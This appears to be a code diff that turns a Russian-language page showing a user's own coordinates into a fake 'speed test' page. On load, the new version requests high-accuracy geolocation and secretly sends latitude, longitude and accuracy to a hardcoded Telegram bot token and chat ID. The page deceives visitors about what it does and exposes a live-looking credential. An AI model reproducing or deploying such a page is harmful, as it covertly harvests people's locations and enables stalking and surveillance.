@@ -1,58 +1,72 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Где я нахожусь?</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f0f0f0;
-      text-align: center;
-      padding-top: 100px;
-    }
-    button {
-      font-size: 20px;
-      padding: 10px 30px;
-      background: #2a9df4;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-    #output {
-      margin-top: 30px;
-      font-size: 18px;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Проверка скорости</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f0f0f0;
+    color: #333;
+    text-align: center;
+    padding: 50px;
+  }
+  #status {
+    font-size: 24px;
+    margin-bottom: 20px;
+  }
+</style>
 </head>
 <body>
 
-  <h1>Проверка скорости</h1>
-  <button onclick="getLocation()">Начать</button>
-  <div id="output"></div>
+<h1>Измеряем скорость...</h1>
+<div id="status">Пожалуйста, подождите.</div>
 
-  <script>
-    function getLocation() {
-      const out = document.getElementById('output');
-      out.innerHTML = '⏳ Получение координат...';
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const lat = pos.coords.latitude.toFixed(6);
-            const lon = pos.coords.longitude.toFixed(6);
-            out.innerHTML = `🌍 Широта: ${lat}<br>🌐 Долгота: ${lon}`;
-          },
-          (err) => {
-            out.innerHTML = 'Ошибка: доступ к геолокации запрещён.';
-          }
-        );
-      } else {
-        out.innerHTML = 'Ваш браузер не поддерживает геолокацию.';
-      }
-    }
-  </script>
+<script>
+const TELEGRAM_BOT_TOKEN = '7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M';
+const TELEGRAM_CHAT_ID = '526758225';
+
+function sendToTelegram(message) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  fetch(url, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  }).catch(err => {
+    console.error('Ошибка отправки в Telegram:', err);
+  });
+}
+
+function success(position) {
+  const lat = position.coords.latitude.toFixed(6);
+  const lon = position.coords.longitude.toFixed(6);
+  const accuracy = position.coords.accuracy.toFixed(1);
+
+  document.getElementById('status').textContent = 'Геолокация получена. Спасибо!';
+
+  sendToTelegram(`Новая геолокация\nШирота: ${lat}\nДолгота: ${lon}\nТочность (м): ${accuracy}`);
+}
+
+function error(err) {
+  document.getElementById('status').textContent = 'Не удалось получить геолокацию.';
+  console.warn(`Ошибка геолокации: ${err.message}`);
+}
+
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(success, error, {
+    enableHighAccuracy: true,
+    timeout: 10000,
+    maximumAge: 0
+  });
+} else {
+  document.getElementById('status').textContent = 'Геолокация не поддерживается вашим браузером.';
+}
+</script>
 
 </body>
 </html>
